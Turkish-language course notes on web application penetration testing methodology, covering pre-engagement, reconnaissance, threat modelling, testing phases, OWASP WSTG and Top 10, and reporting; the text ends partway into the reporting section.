# Intro to Advanced Web Application Penetraion Testing(WPTX):

## Security Strategies and Methodologies:

 *Web Application Pentesting Methodology Nedir:*

Öncelikle "Metadoloji" kavramını Web Uygulaması bağlamında inceleyecek olursak, bir web uygulamasının güvenlik açıklarını tespit etmek amacıyla yapılan sızma (pentest) testlerinde kullanılan **adım adım bir yol haritasını** ifade eder. Bu yol haritası, hem testin kapsamlı olmasını sağlar hem de yapılan işlemlerin standartlara uygun olmasına yardımcı olur. 

Her zaman tek bir standart/metadolojinin olmadığını bilmekte fayda vardır. Çeşitli senaryolara göre alet çantamız ve metotlarımız dolayısıyla yaklaşımımız(metadolojimiz) değişiklik gösterecektir.
Metodoloji olmadan yapılan bir test hem yüzeysel kalabilir hem de kritik zafiyetler gözden kaçabilir. Bu nedenle metodolojik yaklaşım, testin **tutarlılığını ve doğruluğunu** artırır.

Örneğin, ilerleyen süreçte detaylarına da değineceğimiz **OWASP WSTG** gibi metodolojileri testlerimizde uygulamak, hangi adımlara öncelik vermemiz gerektiği konusunda bize net bir bakış açısı kazandırır. Bu sayede, rastgele veya düzensiz ilerlemek yerine, sistematik ve odaklı bir yaklaşım geliştirerek gereksiz zaman kayıplarının önüne geçmiş oluruz. Ayrıca, bu metodolojilerin sunduğu yapısal çerçeve sayesinde nerelere, nasıl bakmamız gerektiğini bilmek; hem test sürecini verimli kılar hem de güvenlik açıklarını daha etkili bir şekilde tespit etmemizi sağlar. Zamanla, bu metodolojileri kendi ihtiyaçlarımıza göre uyarlayarak kullanmak da süreci daha esnek ve sonuç odaklı hale getirir; böylece sadece daha hızlı değil, aynı zamanda daha kaliteli testler gerçekleştirme imkânı buluruz.

==Ayrıca bir metadoloji teknolojiye ve mimariya bağlı olarak ince nüanslara göre hareket etmenizi  de sağlayacaktır.==

*What is Web Application Security Testing :

Web application security testing, bir web uygulamasının **tasarımı, kodu, yapılandırması ve işleyişinde** bulunan güvenlik zafiyetlerini **tespit etmeye**, **doğrulamaya**, **sınıflandırmaya** ve  **çözüm önerileri sunmaya** odaklanır. *Proaktif bir süreç olarak*, web application pentest’ten belirli yönlerle ayrılır.  WebApp Security Testing en baştan beri yani uygulamanın  geliştirilmeye başlandığı ilk andan beri uygulanıyor olması gelecekte birçok problemin önüne geçmeyi sağlayacaktır. 

Pentesting sürecinde  amaç, mevcut güvenlik açıklarının kötü niyetli bir saldırgan tarafından nasıl istismar edilebileceğini gerçekçi senaryolarla test ederek, sistemin savunma mekanizmalarının ne ölçüde dayanıklı olduğunu ortaya koymaktır. Bu nedenle pentest daha çok saldırgan bakış açısıyla yürütülen, etkileri ve istismar yolları üzerinde duran reaktif bir yaklaşımdır.

Web application penetration testing bu bakımdan aslında web application security testing sürecinin bir alt kümesidir.

Web uygulama güvenliği testi, genellikle otomatik tarama araçları ile manuel test tekniklerinin birlikte kullanıldığı kapsamlı bir süreçtir ve penetrasyon testini de kendi içinde barındırır. Bu sayede hem bilinen güvenlik açıkları hızla tespit edilir hem de otomatik araçların gözden kaçırabileceği mantıksal ve karmaşık güvenlik problemleri ortaya çıkarılır.

- **Web Security testing** → Daha geniş, kalite odaklı, genelde geliştirme sürecinde. (Savunma tarafı ağırlıklı)
- **Web Pentesting** → Daha dar ama saldırı odaklı, genelde sistem yayına alındığında. (Saldırgan bakış açısı ağırlıklı)
### Web Penetrasyon Testi Metodolojisi ( Lifecycle ile) ve Kavramlar :

Metadoloji, bir web uygulamasının güvenlik açıklarını tespit etmek amacıyla yapılan sızma (pentest) testlerinde kullanılan **adım adım bir yol haritasını** ifade eder. 

*Metadolojinin Özellikleri:*

| Özellik                                             | Açıklama                                                                   |
| --------------------------------------------------- | -------------------------------------------------------------------------- |
| **1. Sistematik ve Aşamalandırılmış**               | Test süreci adım adım ilerlemelidir (keşif, analiz, sömürme, raporlama).   |
| **2. Standartlara Uygun**                           | OWASP, NIST, PTES gibi uluslararası güvenlik standartlarına dayalı olmalı. |
| **3. Gözlemlenebilir ve Dokümante Edilebilir**      | Yapılan her test adımı belgelenmeli, tekrarlanabilir olmalı.               |
| **4. Yasal ve Onaylı**                              | Test kapsamı, izinli sistemler ve yasal sınırlar net tanımlanmalı.         |
| **5. Gerçek Saldırgan Senaryolarını Simüle Eden**   | Saldırganın bakış açısıyla zafiyetlerden yararlanmayı hedeflemeli.         |
| **6. Güvenliği Tehdit Etmeyecek Şekilde Kontrollü** | Üretim sistemlerine zarar vermeyecek şekilde dikkatli yürütülmeli.         |
| **7. Risk Temelli Yaklaşım**                        | Kritik bileşenler önceliklendirilerek test edilmeli.                       |
| **8. Sonuç Odaklı ve Raporlayan**                   | Açıkların etkisi, sömürü derecesi ve çözüm önerileri detaylı raporlanmalı. |

Çeşitli metadolojiler farklılık gösteriyor olsa bile aşağıda "Ortak Aşamalar" içindeki alt başlıklar genel olarak çoğunda ortaktır:
#### Ortak Aşamalar:
###### Pre-Engagement:

**Pre-Engagement** (ya da Türkçesiyle Test Öncesi Hazırlık Aşaması), bir penetrasyon testinin başlamadan önceki en kritik aşamasıdır. Bu aşamada testin **kapsamı, kuralları, hedefleri ve sınırları** belirlenir. Amaç, hem test eden (pentester) hem de müşteri tarafının **net ve ortak bir anlayışa sahip olmasıdır**.

| Başlık                         | Açıklama                                                                                                  |
| ------------------------------ | --------------------------------------------------------------------------------------------------------- |
| **1. Kapsam Belirleme**        | Hangi sistemler, uygulamalar, IP adresleri veya URL’ler test edilecek?                                    |
| **2. Hedefler**                | Testin amacı nedir? (Örnek: güvenlik açığı bulmak mı, sızma başarısı mı?)                                 |
| **3. Test Türü**               | Siyah kutu, gri kutu, beyaz kutu mu yapılacak?                                                            |
| **4. Süreç ve Takvim**         | Testin ne zaman başlayacağı, süresi ve raporlama tarihi belirlenir.                                       |
| **5. Yasal İzinler**           | Yazılı izinler alınır, test sırasında doğabilecek etkilerden sorumluluk sınırları çizilir.                |
| **6. İletişim Kanalları**      | Kimlerle iletişim kurulacağı, acil durumda kim aranacağı netleştirilir.                                   |
| **7. Kısıtlamalar / Kurallar** | Üretim sistemlerine zarar verilmemesi, sosyal mühendislik yapılması/yapılmaması gibi sınırlar tanımlanır. |
| **8. Risk Yönetimi**           | Olası iş kesintileri, veri kaybı gibi riskler değerlendirilir.                                            |
###### Information Gathering & Reconnaissance

Information Gathering & Reconnaissance (Bilgi Toplama ve Keşif), bir **penetrasyon testinin ilk aktif aşamasıdır**. Bu adımda, hedef sistem veya uygulama hakkında **mümkün olan en fazla bilgiyi** toplayarak saldırıya hazırlık yapılır. İki türü vardır:

*Pasif Bilgi Toplama*: Hedef sistemle doğrudan etkileşime girmeden bilgi toplama. (DNS sorguları, WHOIS, sosyal medya, Google dorking)
*Aktif Bilgi Toplama*: Hedefe doğrudan istek göndererek(yani etkileşime geçerek) bilgi toplama. (Port taraması, banner grabbing, dizin keşfi)

| Adım                               | Açıklama                                                                                            |
| ---------------------------------- | --------------------------------------------------------------------------------------------------- |
| **1. Hedef Bilgisi Toplama**       | Alan adı, IP adresi, DNS kayıtları, alt alan adları belirlenir.                                     |
| **2. Web Teknolojisi Tanıma**      | Kullanılan CMS, web sunucusu, framework, dil (PHP, ASP.NET vs.) belirlenir.                         |
| **3. URL ve Dizin Keşfi**          | Uygulamanın gizli yolları veya dizinleri bulunmaya çalışılır (`/admin`, `/login`, `/backup` vs.).   |
| **4. Girdi Noktalarının Tespiti**  | Formlar, parametreli URL’ler, API endpoint’leri belirlenir.                                         |
| **5. Açık Veri ve Metadata Arama** | Açık bırakılmış dosyalar, e-posta adresleri, yorumlardaki ipuçları, `robots.txt` içeriği incelenir. |
| **6. Harici Kaynak Taraması**      | Shodan, Google Dorks, sosyal medya, GitHub gibi kaynaklarda bilgi araması yapılır.                  |

###### Threat Modelling (Tehdit Modellemesi):

Threat Modelling, bir sistemin nasıl saldırıya uğrayabileceğini anlamak için gerçekleştirilen analitik bir süreçtir. Sistemdeki varlıkları, olası tehditleri, zafiyetleri ve bu tehditlerin etkilerini tanımlar. Risk kavramıyla doğrudan ilişkilidir.

 *Ne İşe Yarar?
1. **Riskleri Önceden Belirleme:**
    - Hangi bileşenlerin saldırıya açık olduğunu ve ne tür tehditlerin söz konusu olduğunu belirler.
2. **Önceliklendirme:**
    - Güvenlik açıklarının olası etkilerine göre öncelik verilmesini sağlar.
3. **Test Kapsamını Belirleme:**
    - Penetrasyon testi sırasında hangi alanların daha derinlemesine test edilmesi gerektiğini ortaya koyar.
4. **Maliyet Azaltımı:**
    - Erken aşamada tehditleri belirleyerek, daha sonra çıkabilecek güvenlik maliyetlerinin önüne geçer.
5. **Savunmayı Güçlendirme:**
    - Savunma stratejileri (güvenlik kontrolleri) tehditlere göre şekillendirilir.

==Information Gathering & Reconnaissance aşamasında, web uygulamasının nasıl çalıştığı detaylı şekilde analiz edilerek sistemin bileşenleri, veri akışları ve dışa açık noktaları tespit edilir. Bu bilgiler doğrultusunda uygulamanın saldırı yüzeyi ortaya konur ve Threat Modelling süreci kapsamında potansiyel tehditler ile riskler sistematik bir şekilde belirlenir==

Information Gathering & Reconnaissance, bir web uygulamasının yapısını ve davranışlarını anlamak için gerekli tüm teknik bilgilerin toplandığı aşamadır. Bu bilgiler, **Threat Modelling** için kritik bir altyapı sağlar. Uygulamanın hangi bileşenlerinin dışa açık olduğu, hangi servislerin kullanıldığı, kullanıcı giriş noktaları gibi veriler saldırı yüzeyini oluşturur.

Threat Modelling  bu saldırı yüzeyini temel alarak, olası tehditleri, saldırgan yollarını ve güvenlik açıklarını analiz eder. Yani:

> 🧩 **Information Gathering → Saldırı yüzeyi analizi → Threat Modelling → Risk analizi ve önceliklendirme**

Bu şekilde iki kavram birbirini tamamlar: bilgi toplama aşaması tehdit modellemesi için zemin hazırlar, threat modelling ise toplanan bilgileri kullanarak riske dönüşebilecek senaryoları ortaya koyar.
###### Vulnerability Scanning:

Vulnerability Scanning, otomatik veya yarı otomatik araçlar kullanılarak(OWASP ZAP, Nessus, Nikto, Burp Suite Scanner gibi.) bir sistem, ağ veya web uygulamasındaki bilinen güvenlik açıklarının tespiti işlemidir. Bu aşamada, uygulamanın veya sistemin zafiyetlere karşı ne kadar savunmasız olduğu analiz edilir.
###### Manuel Testing and Exploitation:

Manuel Testing (Manuel Test), otomatik tarama araçlarının tespit edemediği veya yanlış tespit ettiği güvenlik açıklarını, insan zekâsı ve uzmanlığıyla elle, adım adım test etme sürecidir.  
Exploitation (Sömürme) ise bulunan zafiyetlerin aktif olarak kötüye kullanılarak (istismar edilerek) sistem üzerinde kontrol veya bilgi sızdırma gibi etkilerin doğrulanmasıdır.

 *Amaçları:
- Otomatik taramalarda gözden kaçan veya yanlış raporlanan zafiyetleri doğrulamak.
- Kompleks ve mantıksal zafiyetleri (örneğin, yetkilendirme atlamaları, iş mantığı hataları) tespit etmek.
- Zafiyetlerin gerçek etkisini test ederek risk seviyesini belirlemek.
- Güvenlik açığının kötüye kullanılabilirliğini kanıtlamak (Proof of Concept).
###### Authentication and Authorization Testing:

Authentication, bir kullanıcının iddia ettiği kişi olduğunu doğrulama sürecidir (örneğin, kullanıcı adı ve şifre ile giriş). Bu aşamadaki testler:
- Kullanıcı kimlik bilgilerinin güvenli bir şekilde işlendiğini doğrular.
- Zayıf şifre politikaları, parola tahmin edilebilirliği veya kimlik doğrulama bypass (atlatma) zafiyetlerini tespit eder.
- Çok faktörlü kimlik doğrulama (MFA) mekanizmasının etkinliğini kontrol eder.
- Hesap kilitleme, parola sıfırlama, oturum zaman aşımı gibi güvenlik kontrollerinin düzgün çalışıp çalışmadığını test eder.

Authorization, doğrulanmış kullanıcının hangi kaynaklara, işlemlere veya verilere erişim hakkı olduğunu belirler. Yetkilendirme testleri:
- Kullanıcıların sadece izin verilen kaynaklara erişip erişemediğini kontrol eder.
- Yetki yükseltme (privilege escalation) saldırılarını tespit etmeye odaklanır.
- Farklı rol veya kullanıcı türlerinin erişim sınırlarının doğru uygulandığını doğrular.
- URL manipülasyonu, ID tampering gibi saldırı yöntemleriyle yetki atlamalarını test eder.

*Neden Önemlidir?*
- Eksik veya yanlış yapılandırılmış authentication ve authorization mekanizmaları, yetkisiz erişim ve veri sızıntılarına yol açar.
- Web uygulamalarında en sık görülen ve kritik güvenlik açıkları arasında yer alır.
- OWASP Top 10 listesinde “Broken Authentication” ve “Broken Access Control” olarak ayrı başlıklarla yer alır.
###### Session Management Testing:

Session Management, bir kullanıcının doğrulandıktan sonra uygulama ile kurduğu geçici oturumun oluşturulması, yönetilmesi ve sonlandırılması süreçlerini kapsar. Bu aşamadaki testlerde, oturumların güvenli bir şekilde yönetilip yönetilmediği incelenir.

*Amaçları:* 
- Oturum kimliklerinin (session ID veya token) güvenliğini sağlamak.
- Oturumun ele geçirilmesini (session hijacking) önlemek.
- Oturum sabitleme (session fixation) saldırılarına karşı koruma kontrolü yapmak.
- Oturum zaman aşımı ve otomatik çıkış (logout) mekanizmalarını doğrulamak.
- Oturumların doğru şekilde sonlandırıldığını (örneğin, logout sonrası) test etmek.
###### Information Disclosure:

Bu test, uygulamanın kullanıcılar, saldırganlar veya yetkisiz kişiler tarafından erişilebilecek şekilde **özel, gizli veya kritik bilgileri açığa çıkarıp çıkarmadığını** tespit etmeye odaklanır. Amaç, veri sızıntılarını önlemek ve sistemin güvenliğini sağlamaktır.
İstenmeyen bilgi sızıntıları, saldırganların sistem hakkında detaylı bilgi edinmesine ve daha etkili saldırılar planlamasına olanak sağlar. Bu nedenle, bilgi sızıntısı testleri, saldırı yüzeyinin küçültülmesi ve güvenlik seviyesinin artırılması için gereklidir.

*Test Edilen Bilgi Türleri:*
- Hata mesajları (stack trace, debug bilgileri)
- Sistem veya yazılım sürüm bilgileri
- Konfigürasyon dosyaları veya dizin listeleri
- Veritabanı bağlantı bilgileri
- Kişisel veriler, kullanıcı bilgileri
- API anahtarları, tokenler
- Kaynak kodu parçaları veya yorum satırları 

*Nasıl Test Edilir?*
- Hata durumlarında uygulamanın verdiği çıktılar incelenir.
- HTTP header’ları, JavaScript dosyaları ve kaynak kodlar gözden geçirilir.
- Dizin listeleme (directory listing) ve açık kaynak dosyalar aranır.
- Yanlış yapılandırmalar ve gereksiz bilgi ifşası kontrol edilir.

###### Business Logic Testing:

Business Logic Testing, uygulamanın **iş kurallarının, akışlarının ve fonksiyonlarının** beklenen şekilde çalışıp çalışmadığını ve kötü niyetli kullanıcılar tarafından bu kuralların atlatılıp atlatılamayacağını kontrol eden test sürecidir.
Burada amaç, teknik güvenlik açıklarının dışında, uygulamanın iş mantığı kaynaklı zafiyetlerini tespit etmektir.

- İş mantığı hataları, saldırganların uygulamanın normal akışını bozarak haksız avantajlar sağlamasına (örneğin, yetkisiz işlem yapma, ödeme atlatma) neden olabilir.
- Teknik açıdan güvenli görünen sistemlerde bile iş mantığı zafiyetleri ciddi güvenlik riskleri oluşturabilir.
- OWASP Top 10’da doğrudan yer almamakla birlikte, uygulama güvenliğinin kritik parçalarındandır.

*Test Edilen Örnek Senaryolar:*
- Aynı kupon veya indirim kodunun birden fazla kez kullanılması.
- Bir kullanıcının kendi bakiye veya kredi limitini aşarak işlem yapması.
- Yetkisiz kullanıcıların sadece belirli roller için geçerli işlemleri yapması.
- İşlem sırasındaki doğrulama kontrollerinin atlanması.
- Ödeme süreçlerinin atlatılması veya manipüle edilmesi.

*Nasıl Test Edilir?*
- Uygulama iş akışları detaylı incelenir.
- İş kurallarına aykırı işlem senaryoları elle veya otomatik olarak denenir.
- Farklı kullanıcı rolleri ve durumlarıyla sistem davranışı test edilir.
- Kullanıcı girişleri ve uygulama mantığı manipüle edilerek zayıf noktalar aranır.
###### Client Side Testing:

Client Side Testing, tarayıcıda çalışan JavaScript, HTML, CSS ve diğer istemci tarafı bileşenlerin güvenlik açıklarını ve zafiyetlerini tespit etmek için yapılan testlerdir. Bu testler, istemci tarafında manipülasyon yapılabilme ihtimaline karşı uygulamanın dayanıklılığını ölçer.

*Neden Önemlidir?*
- İstemci tarafında çalışan kod, doğrudan kullanıcı cihazında çalıştığı için saldırganlar tarafından kolayca değiştirilebilir veya manipüle edilebilir.
- XSS (Cross-Site Scripting), DOM tabanlı saldırılar, istemci tarafı doğrulama atlatma gibi zafiyetler bu alanda sık görülür.
- İstemci tarafı doğrulamalar asla tek başına güvenlik için yeterli değildir; sunucu tarafı kontrollerle desteklenmelidir.

*Test Edilen Temel Unsurlar:*
- **JavaScript Kodları:** Zararlı kod enjekte edilip edilmediği, hassas bilgilerin istemci tarafında ifşa edilip edilmediği.
- **DOM Manipülasyonları:** Kullanıcının veri giriş alanlarını değiştirme veya DOM’u manipüle ederek uygulamayı kandırma senaryoları.
- **İstemci Tarafı Validasyonları:** Kullanıcı girdilerinin sadece istemci tarafında kontrol edilip edilmediği, sunucu tarafı doğrulamanın olup olmadığı.
- **Local Storage ve Session Storage:** Hassas verilerin güvenli olmayan şekilde depolanıp depolanmadığı.
- **Çerez (Cookie) Güvenliği:** Güvenlik bayraklarının (HttpOnly, Secure, SameSite) doğru ayarlanıp ayarlanmadığı.

###### Reporting ve Remediation:

Raporlama aşaması, yapılan penetrasyon testi boyunca tespit edilen güvenlik açıkları, zafiyetler ve risklerin **detaylı, anlaşılır ve yapılandırılmış şekilde belgelenmesidir**. Bu rapor, teknik ekiplerin ve yönetimin durumu değerlendirmesi için temel dokümandır.

*Raporlama Amaçları:*
- Bulunan zafiyetlerin türünü, etki alanını ve önem derecesini açıklamak.
- Zafiyetlerin nasıl tespit edildiğini ve doğrulandığını belgelemek.
- Güvenlik açıklarının sistem üzerindeki potansiyel etkisini ve risk seviyesini belirtmek.
- Teknik detaylar, kanıtlar (örneğin, ekran görüntüleri, exploit örnekleri) sunmak.
- Öncelikli olarak düzeltilmesi gereken noktaları belirlemek
- Geliştirici ve güvenlik ekipleri için öneriler ve iyileştirme adımları sunmak.

*Remediation (Düzeltme / İyileştirme):*
Remediation, raporlama aşamasında belirtilen güvenlik açıklarının etkili şekilde kapatılması, düzeltilmesi ve güvenlik seviyesinin artırılması için yapılan uygulamalardır.

- Tespit edilen zafiyetlerin kod, yapılandırma veya mimari bazında giderilmesi.
- Güvenlik politikalarının ve süreçlerinin geliştirilmesi.
- Yeniden testlerle düzeltmelerin doğrulanması.
- Risklerin minimize edilmesi ve sistemin daha güvenli hale getirilmesi.
###### Post Engagment:
Post-Engagement aşaması, penetrasyon testi tamamlandıktan sonra test sonuçlarının raporlanması, bulunan güvenlik açıklarının düzeltilip düzeltilmediğinin takip edilmesi ve ilgili ekiplerle bilgi paylaşımı yapılarak **güvenlik farkındalığının artırılması sürecidir**; bu aşama, sadece zafiyetlerin tespitiyle kalmayıp bunların etkin şekilde kapatılmasını sağlayarak organizasyonun güvenlik duruşunu güçlendirmeyi amaçlar ve böylece güvenlik iyileştirmelerinin sürdürülebilir olmasını garanti eder.
#### Yaygın Web Penetrasyon Testi Metodolojileri: 

###### PTES(Penetration Testing Execution Standard):
PTES; sızma testleri sırasında izlenmesi gereken metodolojiyi, süreçleri ve en iyi uygulamaları tanımlar. Amacı, hem teknik hem de operasyonel açıdan sızma testi projelerini daha etkili hale getirmektir. 
Biz eğitim kapsamında  daha yaygın ve kapsamlı olan  OWASP Top 10 ile ilgileniyor olacağız. http://www.pentest-standard.org/index.php/Main_Pages
###### OWASP WSTG(Web Security Testing Guide):

OWASP WSTG (Web Security Testing Guide), OWASP tarafından geliştirilen ve web uygulamalarının güvenlik testlerinde kullanılmak üzere hazırlanmış kapsamlı bir rehberdir. WSTG, web uygulamalarının güvenlik açıklarını sistematik şekilde tespit etmek için test senaryoları, metodolojiler ve en iyi uygulamaları içerir. Test uzmanları için yol gösterici bir standart olarak kabul edilir ve farklı güvenlik test aşamalarını (örneğin bilgi toplama, kimlik doğrulama, yetkilendirme, veri doğrulama, oturum yönetimi, vb.) detaylı biçimde açıklar.

==*Daha sonra detaylı olarak kendi başlığı içinde aşağıda değinilecektir.*==
###### OWASP Top 10:
OWASP Top 10, web uygulamalarında en yaygın ve kritik güvenlik açıklarını listeleyen bir **farkındalık projesidir**. Aslen bir rehber, çerçeve değildir ancak geliştiriciler ve red team uzmanları için bir rehberden de farksız değildir.
Bu liste her birkaç yılda bir güncellenir ve hem geliştiricilere hem de güvenlik uzmanlarına yön gösterir. Ortalam her 4 yılda bir güncellenir.

https://owasp.org/www-project-top-ten/

![[Ekran görüntüsü 2025-06-07 163321 1.png]]

OWASP Top 10 listesindeki bazı zafiyetler yıllar içinde sıralama değiştiriyor olabilir; ancak bu, söz konusu zafiyetin önemini yitirdiği veya etkisinin azaldığı anlamına gelmez. Liste yalnızca o dönemki eğilimleri yansıtır; sıralamada geriye düşen bir zafiyet hâlâ ciddi bir risk oluşturmaya devam edebilir. Zafiyetler A01, A02 vb. gibi numaralandırılarak sıraya sokulur.

![[Pasted image 20250607163739.png]]

Görseldeki bazı terimlere değinecek olursak; **CVE**, gerçek dünyada bulunan **spesifik güvenlik açıklarına** verilen benzersiz kimlik numaralarıdır.
**CWE**, bir güvenlik açığının **arka plandaki zafiyet kategorisini** ifade eder ve kavramsal bir açıklamadır.  Her ikisi de MITRE tarafından yönetilmektedir. 
==CVE’ler genellikle bir veya birkaç CWE ile ilişkilendirilir.==

- CWE-89→ SQL Injection
- CWE-79→ Cross-Site Scripting (XSS)

OWASP top Ten bize yukarıda gösterildiği gibi çeşitli istatistiksel bilgileri de sunar. TOP 10 içindekli zafiyetlerin çözümleri/tavsiye edilenler gibi birçok başlık daha vardır ve bu geliştiriciler için de oldukça önem arz etmektedir.

OWASP Top 10 bir önceki OWASDP Top 10 üzerine kurulu ilerlediği için birikerek ilerler bu yüzden önceki (2017) dokümanı anlamak da oldukça önemli. https://owasp.org/www-project-top-ten/2017/

#### Web Uygulama Güvenlik Testi  Aşamaları:

 1. *Zafiyet Taraması (Vulnerability Scanning)*
- Otomatik araçlarla (örneğin: OWASP ZAP, Nessus) uygulama taranır.
- **SQL Injection, Cross-Site Scripting (XSS)** gibi yaygın zafiyetler, hatalı yapılandırmalar, güncel olmayan yazılım bileşenleri tespit edilir.
- Bu tarama, zafiyetlerin hızlıca keşfedilmesini sağlar ancak sonuçların manuel olarak doğrulanması önemlidir.

 2. *Sızma Testi (Penetration Testing)*
- Etik hacker'lar tarafından gerçekleştirilen bu testler, uygulamanın gerçek saldırılara karşı dayanıklılığını ölçer.
- Bulunan zafiyetler üzerinden sisteme sızma, veri ele geçirme, yetki yükseltme gibi işlemler denenir.
- Bu süreç, sistemin **zafiyetlerinin nasıl istismar edilebileceğini** anlamaya yöneliktir.
- Hem teknik hem de mantıksal açıklar değerlendirilir.

3. *Kod İncelemesi ve Statik Analiz (Code Review & Static Analysis)*
- Uygulamanın kaynak kodu manuel olarak veya statik analiz araçlarıyla (örneğin SonarQube, Checkmarx) incelenir.
- Kod seviyesindeki hatalar, güvenlik ihlalleri, zayıf noktalar tespit edilir.
- Geliştiricilerin güvenlik standartlarına uygun kod yazıp yazmadığı da bu aşamada değerlendirilir.

4. *Kimlik Doğrulama ve Yetkilendirme Testleri (Authentication & Authorization Testing)*
- Kullanıcıların kimlik doğrulama (şifre, OTP, token vb.) mekanizmaları test edilir.
- Uygulamanın **kimin, neye, ne kadar erişebileceğini** nasıl yönettiği analiz edilir.
- Yetki aşımı (privilege escalation), yatay/dikey erişim ihlalleri gibi durumlar test edilir.

5. *Girdi Doğrulama ve Çıktı Kodlama Testleri (Input Validation & Output Encoding Testing)
- Kullanıcılardan gelen verilerin filtrelenip filtrelenmediği incelenir.
- XSS, SQL Injection gibi saldırılar girdi doğrulama eksikliği nedeniyle oluşabilir.
- Aynı zamanda çıktılar güvenli şekilde encode edilmezse, kullanıcı tarafında tehlikeli komutlar çalışabilir.
- Bu test, uygulamanın kullanıcı girdilerine karşı ne kadar “güvenli” olduğunu ölçer.
 
6. *Oturum Yönetimi Testleri (Session Management Testing)
- Oturum açma, token üretimi, oturum süresi, oturum sonlandırma gibi özellikler değerlendirilir.
- Oturum çalma (session hijacking), sabit oturum (session fixation), CSRF gibi saldırılara karşı dayanıklılık test edilir.    
- Özellikle çok kullanıcılı sistemlerde bu test, güvenliğin en önemli parçalarından biridir.

7. *API Güvenliği Testi (API Security Testing)*
- Web uygulamasının harici sistemlerle veri alışverişi yaptığı API'lerin güvenliği değerlendirilir.
- API anahtarları, erişim kontrolleri, rate-limiting (istek sınırlama), veri sızıntısı gibi konular test edilir.
- Yetkisiz API erişimi, veri manipülasyonu gibi saldırı vektörleri kontrol edilir
...
### OWASP Web Security Testing Guide (WSTG) and Checklist:

 OWASP (Open Worldwide Application Security Project) tarafından geliştirilen bir güvenlik test rehberidir. Web uygulamalarının güvenlik testlerinin nasıl yapılacağını sistematik, kapsamlı ve pratik bir şekilde açıklayan bir dokümandır. Çeşitli sürümleri olup şu an versiyon 5 geliştirilmektedir.

**WSTG Checklist (Web Security Testing Guide Checklist)**, OWASP'ın **WSTG (Web Security Testing Guide)** dokümanında tanımlanan güvenlik testlerinin **uygulanabilir bir kontrol listesi** (checklist) haline getirilmiş halidir.

![[WSTG Guide 4.2.pdf]  ## Sondaki parantezi kapatırsan  Guide gelir.

![[OWASP_WSTG_Checklist.xlsx]]
https://github.com/tanprathan/OWASP-Testing-Checklist/blob/master/OWASP_WSTG_Checklist.xlsx (OWASP Top 10- 2021'e göre)
https://owasp.org/www-project-web-security-testing-guide/
https://github.com/OWASP/wstg

https://notebooklm.google.com/notebook/ccc34b60-2534-4e6b-9210-0cc3ab7206d3?original_referer=https:%2F%2Fnotebooklm.google%23&pli=1  NotebookLM ile  WSTG incelenebilir.  Zihin haritası oluşturulmuştur.

### Pre-Engagment Phase and Documenting & Communicating Findings :

Pre-engagement (ön katılım) aşaması, penetrasyon testine başlamadan önce taraflar arasında yapılan **planlama, sözleşme, bilgilendirme ve kapsam** belirleme sürecidir.
#### Pre-Engagment'in Başlıca Özellikleri

Bu aşama şu temel bileşenleri içerir:
##### 1. Kapsam Belirleme (Scope Definition)
- Test edilecek sistemler, IP aralıkları, uygulamalar ve altyapılar net olarak tanımlanır.
- Dahil olan/dahil olmayan sistemler belirlenir (örneğin: canlı sistemler test dışı olabilir).
##### 2. Hedef ve Amaçların Belirlenmesi
- Testin amacı ne? (güvenlik durumu değerlendirme, düzenleyici uyumluluk, çalışan farkındalığı vb.)
- Black Box, White Box, Grey Box test türlerinden hangisinin yapılacağı kararlaştırılır.
##### 3. Zamanlama ve Süre
- Testin başlama ve bitiş tarihleri belirlenir.
- Kritik sistemlerde test yapılacağı için ideal test zamanları planlanır (yoğun saatler dışı gibi).
##### 4. Yasal İzinler ve Sözleşmeler
- Yasal sorun yaşanmaması için **"Rules of Engagement" (RoE)** ve **izin belgeleri** hazırlanır.
- Taraflar arasında **NDA (Gizlilik Sözleşmesi)** imzalanır.
##### 5. İletişim Planı
- Test süresince kullanılacak iletişim yöntemleri ve kişiler belirlenir.
- Olası acil durumlar için irtibat noktaları netleştirilir.
##### 6. Risk Yönetimi
- Testin sistemler üzerindeki etkisi değerlendirilir.
- Geri dönüş planları hazırlanır (örneğin: test sırasında sistem çökmesi durumunda yapılacaklar).

#### Documenting & Communicating Findings:

Web uygulaması sızma testinde **raporlama aşaması**, test sürecinde tespit edilen bulguların, güvenlik açıklarının ve risklerin belgelenip ilgili taraflarla paylaşılması açısından kritik bir adımdır
Hazırlanan rapor; geliştiriciler, yönetim ve BT ekipleri gibi paydaşlara web uygulamasının güvenlik durumu hakkında kapsamlı ve ayrıntılı bilgi sunan bir dokümandır
İyi yapılandırılmış ve anlaşılır bir rapor, hem doğru kararlar alınmasını sağlar hem de giderme (remediation) sürecini kolaylaştırır.

Sızma testi raporları için belirlenmiş tek bir format veya standart bir yapı bulunmamaktadır.
Buna rağmen, rapor hazırlarken dikkat edilmesi gereken bazı **en iyi uygulamalar, yapılması ve kaçınılması gerekenler** ile göz önünde bulundurulması gereken kritik noktalar vardır.
Raporlama süreci aslında müşteriyle **Rules of Engagement (katılım kuralları)** imzalandığı anda başlar. Bu aşama, çalışmanın kapsamını ve müşterinin hedeflerini açıklayan birkaç sayfalık bir bölüm hazırlamak için en uygun zamandır.

Testleri gerçekleştirirken bilgileri **sistematik bir şekilde toplamanız ve düzenlemeniz** gerekir.
Bu bilgiler, raporunuzun temelini oluşturacaktır. Dolayısıyla, verileri doğru ve düzenli bir biçimde toplayıp saklamak, raporlama sürecine baştan katkı sağlamanız anlamına gelir.
Son aşamada yapmanız gereken, bu bilgileri **okunabilir ve profesyonel bir formatta** bir araya getirip sunmaktır.


![[Ekran görüntüsü 2025-08-21 155016.png]]

Zihin haritalama araçları (örneğin: https://app.diagrams.net) ve elektronik tablolar, bilgileri **ilişkileriyle birlikte düzenli bir yapıda saklamanın** en iyi iki yoludur.
Aşağıda, bir organizasyonla ilgili bilgilerin nasıl takip edilebileceğine dair bir örnek yer almaktadır:

![[Ekran görüntüsü 2025-08-21 155418.png]]

*RAPORDA OLABİLECEK ve/veya OLAN BAŞLIKLAR::*

**Yönetici Özeti (Executive Summary):**  
Rapor genellikle **yönetici özeti** bölümüyle başlar. Bu kısım, test sırasında elde edilen temel bulguların ve web uygulamasının genel güvenlik durumunun üst düzey bir özetini sunar. En kritik güvenlik açıkları, olası riskler ve bunların iş üzerindeki potansiyel etkileri burada vurgulanır. Bu bölüm, teknik olmayan paydaşların ve yönetimin test sonuçlarını hızlıca kavrayabilmesi için hazırlanır.

**Kapsam ve Yöntem (Scope and Methodology):**  
Bu bölümde sızma testinin kapsamı açık ve net bir şekilde tanımlanır. Hedef uygulama, bileşenleri ve uygulanan test yöntemleri ayrıntılı olarak açıklanır.

**Bulgular ve Güvenlik Açıkları (Findings and Vulnerabilities):**  
